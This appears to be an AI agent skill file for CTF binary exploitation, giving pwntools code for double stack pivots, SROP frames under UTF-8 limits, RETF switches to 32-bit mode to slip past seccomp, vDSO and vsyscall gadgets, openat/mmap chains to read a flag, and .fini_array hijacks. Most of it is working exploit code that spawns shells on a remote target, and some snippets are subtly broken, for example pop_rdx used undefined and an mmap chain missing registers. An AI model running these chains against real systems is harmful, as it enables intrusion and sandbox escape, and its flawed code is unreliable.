---
name: pwn-rop-advanced
description: "CTF advanced ROP techniques. Double stack pivot via leave/ret, SROP with UTF-8 constraints, architecture switching via RETF to bypass seccomp, vDSO gadget harvesting, vsyscall fixed addresses, .fini_array hijack, seccomp alternative syscalls. Triggers: 'rop advanced', 'stack pivot', 'srop', 'sigreturn', 'retf', 'architecture switch', 'vsdo gadgets', 'seccomp bypass rop', 'fini_array hijack', 'rop chain advanced'."
---

# CTF Pwn: Advanced ROP Techniques

Stack pivot, SROP, retf architecture switch, vDSO, seccomp bypass alternatives.

---

## Phase 1: Double Stack Pivot

```python
from pwn import *

# When overflow too small for full ROP chain:
# 1. Pivot to writable BSS/data region
# 2. Call fgets to load larger ROP chain
# 3. Second pivot to full ROP

elf = ELF('./challenge')
libc = ELF('./libc.so.6')
r = remote('target', 1337)

# Gadgets:
leave_ret = 0x401234    # leave; ret: pivots RSP to RBP
pop_rdi = 0x401111
pop_rsi = 0x401222
pop_rbp = 0x401333

# Stage 1 payload (minimal: fits in small overflow):
bss_addr = elf.bss() + 0x100
stage1 = flat(
    pop_rbp, bss_addr,       # set rbp = bss
    pop_rdi, bss_addr,       # fgets arg1 = buffer = bss
    pop_rsi, 0x200,          # arg2 = size
    pop_rdx, elf.got.stdin,  # arg3 = stdin
    elf.plt.fgets,           # call fgets → reads stage2 into bss
    leave_ret                # leave: RSP = RBP = bss; ret → stage2
)

# Stage 2 (full ROP chain in BSS):
stage2 = flat(
    pop_rdi, next(libc.search(b'/bin/sh\x00')),
    libc.sym.system
)

r.send(b'A' * OFFSET + stage1)
r.send(stage2 + b'\n')
r.interactive()
```

---

## Phase 2: SROP with UTF-8 Constraints

```python
from pwn import *

# Rust binary: input must be valid UTF-8
# sigreturn frame minimizes gadget requirements
# Only 3 gadgets needed: syscall; ret (0x0f 0x05 0xc3 = valid UTF-8)

context.arch = 'amd64'

def sigreturn_frame_utf8():
    """Build SROP frame using UTF-8-safe bytes."""
    
    # Valid UTF-8 gadgets (each byte is ASCII or valid UTF-8 continuation):
    # mov rax, 15; syscall = SYS_rt_sigreturn
    # Frame sets all registers including RIP → execve
    
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve
    frame.rdi = stack_addr + OFFSET_TO_BINSH  # "/bin/sh\x00"
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall_ret_addr
    frame.rsp = stack_addr  # needed for IRET
    
    return bytes(frame)

# Multi-byte UTF-8 trick: span two adjacent frame fields
# 0xED 0xA0 0x80 = valid 3-byte UTF-8 (U+D800: technically invalid, but accepted by many parsers)
# Use 3-byte sequences to embed 2-byte values in frame
```

---

## Phase 3: Architecture Switch via RETF

```python
from pwn import *

# Bypass seccomp on 64-bit by switching to 32-bit mode
# CS=0x23 = 32-bit compatibility mode
# Syscall numbers differ in 32-bit → different seccomp profile

# Find RWX region (via mprotect or existing):
TARGET_ADDR = 0x400000  # example

# 32-bit execve shellcode (different syscall number: 11 not 59):
shellcode_32bit = asm('''
    push 0x68
    push 0x732f2f2f    
    push 0x6e69622f    ; "/bin///sh"
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    push 11            ; SYS_execve = 11 in i386
    pop eax
    int 0x80
''', arch='i386')

# Construct RETF (far return) to 32-bit mode:
# retf: pop rip, pop cs
# CS=0x23 = 32-bit compatibility
retf_payload = flat(
    TARGET_ADDR,  # new RIP
    0x23          # CS = 32-bit
)

# Prepend to payload: jump into 32-bit shellcode region
```

---

## Phase 4: vDSO Gadget Harvesting

```python
from pwn import *

# Statically-linked binary: no libc ROP gadgets
# vDSO: kernel-mapped page always present at deterministic ASLR offset

# Find vDSO base via auxiliary vector:
r = process('./challenge')

# Read /proc/PID/maps to find vDSO:
import subprocess, re

pid = r.pid
maps = open(f'/proc/{pid}/maps').read()
vdso_match = re.search(r'([0-9a-f]+)-[0-9a-f]+ .* \[vdso\]', maps)
if vdso_match:
    vdso_base = int(vdso_match.group(1), 16)
    print(f"vDSO at: {hex(vdso_base)}")

# Dump vDSO and find gadgets:
vdso_data = open(f'/proc/{pid}/mem', 'rb')
vdso_data.seek(vdso_base)
vdso_bytes = vdso_data.read(0x2000)

# ROPgadget on vDSO dump:
# python3 ROPgadget.py --rawmode --rawarch x64 --binary vdso.bin
with open('/tmp/vdso.bin', 'wb') as f:
    f.write(vdso_bytes)

import subprocess
result = subprocess.run(['ROPgadget', '--binary', '/tmp/vdso.bin'], 
    capture_output=True, text=True)
print(result.stdout[:5000])
```

---

## Phase 5: Vsyscall Fixed Addresses (Legacy)

```bash
# Older kernels: vsyscall at fixed 0xffffffffff600000
# Contains `ret` gadget usable for PIE bypass

# Check if vsyscall available:
cat /proc/self/maps | grep vsyscall

# Vsyscall pages:
# 0xffffffffff600000: gettimeofday
# 0xffffffffff600400: time
# 0xffffffffff600800: getcpu
# All contain valid instructions + ret = ROP gadgets at known address

# In exploit (if vsyscall present):
VSYSCALL_RET = 0xffffffffff600000  # 'call' then immediately ret
```

---

## Phase 6: Seccomp Alternative Syscalls

```python
# When seccomp blocks standard open/read/write/execve:
# Use alternative syscalls

from pwn import *

elf = ELF('./challenge')
libc = ELF('./libc.so.6')

# Check what's allowed:
# seccomp-tools dump ./challenge

SECCOMP_ALTERNATIVES = {
    'open':    ('openat',  257),   # openat(AT_FDCWD, path, flags)
    'read':    ('pread64', 17),    # or mmap then access
    'write':   ('writev',  20),    # or sendfile
    'execve':  ('execveat',322),   # less commonly blocked
}

rop = ROP(libc)
FLAG_PATH = b'/flag\x00'
flag_path_addr = next(libc.search(FLAG_PATH)) if FLAG_PATH in libc.data else elf.bss() + 0x200

# openat(AT_FDCWD=-100, "/flag", 0) → fd=3
rop.raw(pop_rdi); rop.raw(0xffffffffffffff9c)  # AT_FDCWD = -100
rop.raw(pop_rsi); rop.raw(flag_path_addr)
rop.raw(pop_rdx); rop.raw(0)                   # O_RDONLY
rop.call(libc.sym.openat)

# mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd=3, 0)
rop.raw(pop_rdi); rop.raw(0)           # addr = NULL
rop.raw(pop_rsi); rop.raw(0x1000)      # length
rop.raw(pop_rdx); rop.raw(1)           # PROT_READ
# r10 = MAP_PRIVATE, r8 = fd = 3, r9 = 0 → need r10/r8/r9 gadgets
rop.call(libc.sym.mmap)

# write(1, mmap_ret, 4096)
rop.raw(pop_rdi); rop.raw(1)           # stdout
# rsi = mmap return value (in rax after mmap)
rop.raw(pop_rdx); rop.raw(0x1000)
rop.call(libc.sym.write)
```

---

## Phase 7: .fini_array Hijack

```python
from pwn import *

# .fini_array: function pointer array called when main() returns
# Even under Full RELRO, .fini_array section may be writable

elf = ELF('./challenge')

FINI_ARRAY_ADDR = elf.address + 0x3d10  # from readelf -S
WIN_ADDR = elf.sym.win

# Write win() address to .fini_array[0]:
# After return from main → __libc_csu_fini → calls fini_array entries

# Via format string:
# %hn to write 2 bytes at a time
# Need to control format string arg that points to fini_array

# Seccomp check:
# seccomp-tools dump ./challenge 2>/dev/null
```

---

## Output

Save to `.omop/engagement/ctf/pwn/`:
- `exploit.py`: working ROP chain
- `flag.txt`: captured flag

## Next Phase

→ `ctf-pwn-advanced-exploits` for VM/JIT/UAF patterns
→ `ctf-pwn-kernel` for kernel exploitation
